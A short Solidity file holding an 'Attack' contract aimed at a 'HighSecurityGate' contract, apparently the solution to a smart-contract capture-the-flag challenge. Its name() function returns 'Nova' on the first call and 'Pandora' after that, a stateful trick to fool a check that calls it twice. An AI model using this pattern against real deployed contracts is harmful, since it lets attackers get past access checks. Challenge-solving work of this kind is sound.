// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface HighSecurityGate {
    function enter() external;
    function lastEntrant() external view returns (string memory);
}

contract Attack {
    // storage, persists throughout function calls
    uint256 timesCalled;
    
    HighSecurityGate private target;
    
    constructor(address highSecurityGateAddress) {
        target = HighSecurityGate(highSecurityGateAddress);
    }
    
    function pwn() external {
        target.enter();
    }
    

    function name() external returns (string memory) {
        timesCalled++;
        if (timesCalled > 1) {
            return "Pandora";
        }
        return "Nova";
    }
}
